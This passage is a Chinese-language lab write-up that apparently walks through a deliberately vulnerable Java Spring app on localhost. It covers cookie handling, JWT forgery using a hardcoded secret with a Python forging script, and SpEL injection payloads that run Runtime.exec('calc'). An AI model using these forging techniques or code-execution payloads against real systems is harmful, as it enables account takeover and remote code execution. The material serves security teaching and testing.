        Cookie[] cookie = req.getCookies();

        if (cookie != null) {
            nick = getCookie(req, NICK).getValue();  // key code
        }

        return "Cookie nick: " + nick;
    }
```

---

### /cookie/**vuln03**

漏洞代码：

```
   @GetMapping(value = "/vuln03")
    public String vuln03(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) {
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }
```

---

### /cookie/vuln04

漏洞代码：

```
@GetMapping(value = "/vuln04")
    public String vuln04(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }
```

---

### /cookie/vuln05

漏洞代码：

```
   @GetMapping(value = "/vuln05")
    public String vuln05(@CookieValue("nick") String nick) {
        return "Cookie nick: " + nick;
    }
```

---

### /cookie/vuln06

漏洞代码：

```
@GetMapping(value = "/vuln06")
    public String vuln06(@CookieValue(value = "nick") String nick) {
        return "Cookie nick: " + nick;
    }
```

---

### 漏洞利用

我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞

---

## jwt伪造

jwt漏洞首先需要爆破出密钥，然后再进行伪造

创建jwt属性值

```
http://127.0.0.1:8080/jwt/createToken
```

从jwt属性值中解密获取user值

```
http://127.0.0.1:8080/jwt/getName
```

创建jwt代码

```
@GetMapping("/createToken")
public String createToken(HttpServletResponse response, HttpServletRequest request) {
    String loginUser = request.getUserPrincipal().getName();//获取登录用户名
    log.info("Current login user is " + loginUser);

    CookieUtils.deleteCookie(response, COOKIE_NAME);//删除原本cookie中自带的USER_COOKIE属性值
    String token = JwtUtils.generateTokenByJavaJwt(loginUser);//调用generateTokenByJavaJwt方法生成jwt
    Cookie cookie = new Cookie(COOKIE_NAME, token);//设置为新的USER_COOKIE的属性值

    cookie.setMaxAge(86400);    // 1 DAY
    cookie.setPath("/");
    cookie.setSecure(true);
    response.addCookie(cookie);
    return "Add jwt token cookie successfully. Cookie name is USER_COOKIE";
}
```

```
    private static final long EXPIRE = 1440 * 60 * 1000;  //1天
    private static final String SECRET = "123456";//设置密钥

public static String generateTokenByJavaJwt(String nickname) {
    return JWT.create()
            .withClaim("nickname", nickname)
            .withExpiresAt(new Date(System.currentTimeMillis() + EXPIRE))
            .withIssuedAt(new Date())
            .sign(Algorithm.HMAC256(SECRET));
}
```

当用户访问该路由时，cookie中的USER_COOKIE属性值就会被更改为一个由登录用户名和密钥123456决定的一个jwt值，

解密jwt属性值

```
@GetMapping("/getName")
    public String getNickname(@CookieValue(COOKIE_NAME) String user_cookie) {
        String nickname = JwtUtils.getNicknameByJavaJwt(user_cookie);
        return "Current jwt user is " + nickname;
    }
```

用户访问该路由时，程序会获取cookie获取cookie中USER_COOKIE的属性值并传入`getNicknameByJavaJwt`方法中，

```
public static String getNicknameByJavaJwt(String token) {
    
    if (!verifyTokenByJavaJwt(token)) {
        log.error("token is invalid");
        return null;
    }
    return JWT.decode(token).getClaim("nickname").asString();//解码jwt,并且获取其中的nickname属性值


}
```

进入`verifyTokenByJavaJwt`方法

```
public static Boolean verifyTokenByJavaJwt(String token) {
    try {
        Algorithm algorithm = Algorithm.HMAC256(SECRET);
        JWTVerifier verifier = JWT.require(algorithm).build();
        verifier.verify(token);
        return true;
    } catch (JWTVerificationException exception){
        log.error(exception.toString());
        return false;
    }
}
```

创建一个HMAC256算法的实例和对应的JWT[验证器](https://so.csdn.net/so/search?q=验证器&spm=1001.2101.3001.7020)，然后使用验证器来验证提供的JWT是否有效。如果验证成功，返回`true`,然后`getNicknameByJavaJwt`返回jwt属性中的nickname属性值

---

这里可以利用verifyTokenByJavaJwt方法来爆破密钥，如果密钥不正确则会抛出异常。

先通过路由/jwt/createToken得到jwt token。然后放入jwt.io中查看解码后的结构

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuaWNrbmFtZSI6ImFkbWluIiwiZXhwIjoxNzU0MzAzMjE3LCJpYXQiOjE3NTQyMTY4MTd9.rzY3sl42F01p4zxdooGpd4a64CvmeZXwIUIcFSXr4Ko
```

![](../image/jsc-6.png)

不过这里爆破的性能特别慢，有字典会快一点，这里我就不爆破了。

使用脚本伪造jwt

```
import jwt

def generate_token():
    headers = 
	{
  		"typ": "JWT",
  		"alg": "HS256"
	}
	
    keys = "123456"

    payload = 
	{
  		"nickname": "MIXBP",
  		"exp": 1754303217,
  		"iat": 1754216817
	}

    token = jwt.encode(payload=payload, key=keys, algorithm='HS256', headers=headers)
    return token
print(generate_token())
```

得到伪造后的jwt：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuaWNrbmFtZSI6Ik1JWEJQIiwiZXhwIjoxNzU0MzAzMjE3LCJpYXQiOjE3NTQyMTY4MTd9.JzI9_Z73vrwp78SX_3ocW02tYzy9XmrqydvxPCfCxHo
```

![](../image/jsc-7.png)

伪造成功

---

## SpEL

Spring Expression Language 是一种表达式语言，支持运行时查询和操作对象图，同时也有方法调用和字符串模板功能

SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：

    引用其他对象:#{car}
    引用其他对象的属性：#{car.brand}
    调用其它方法 , 还可以链式操作：#{car.toString()}

1.类类型表达式

使用T()运算符会调用类作用域的静态属性或静态方法，SpEL内置了java.lang包下的类声明，也就是说java.lang.String可以通过T(String)访问，而不需要使用全限定名
比如：

```
T(Runtime).getRuntime().exec(\"open /Applications/Calculator.app\")
```

2.类实例化
使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问。
比如

```
new java.util.Date()
```

### /spel/vuln1

漏洞源码：

```
@RequestMapping("/spel/vuln1")
public String spel_vuln1(String value) {
    // 第1行：创建SpEL表达式解析器
    ExpressionParser parser = new SpelExpressionParser();
    
    // 第2行：解析用户输入并直接执行，然后返回结果
    return parser.parseExpression(value).getValue().toString();
}
```

#### 漏洞分析：

- **直接解析用户输入**：`value` 参数直接传递给 `parseExpression()`
- **无任何过滤**：用户输入的SpEL表达式会被直接执行
- **高危漏洞**：攻击者可以执行任意SpEL表达式

payload：

```
http://127.0.0.1:8081/spel/vuln1?value=T(java.lang.Runtime).getRuntime().exec('calc')
-> http://127.0.0.1:8081/spel/vuln1?value=T(java.lang.Runtime).getRuntime().exec(%27calc%27)
```

### spel/vuln2

漏洞源码：

```
@RequestMapping("spel/vuln2")
public String spel_vuln2(String value) {
    // 第1行：创建SpEL评估上下文 - 这是漏洞的关键之一
    StandardEvaluationContext context = new StandardEvaluationContext();
    
    // 第2行：创建SpEL表达式解析器
    SpelExpressionParser parser = new SpelExpressionParser();
    
    // 第3行：解析用户输入的value参数，使用模板解析上下文
    Expression expression = parser.parseExpression(value, new TemplateParserContext());
    
    // 第4行：执行表达式并获取结果 - 这是触发漏洞的点
    Object x = expression.getValue(context);    // trigger vulnerability point
    
    // 第5行：将执行结果转换为字符串返回
    return x.toString();   // response
}
```

#### 漏洞分析：

- **使用 `TemplateParserContext`**：这允许模板表达式如 `#{...}`
- **`StandardEvaluationContext`**：提供了完整的SpEL功能，包括方法调用、属性访问等
- **同样直接执行用户输入**

payload：

```
http://127.0.0.1:8081/spel/vuln2?value=#{T(java.lang.Runtime).getRuntime().exec('calc')}
->
http://127.0.0.1:8081/spel/vuln2?value=%23%7BT(java.lang.Runtime).getRuntime().exec('calc')%7D
```













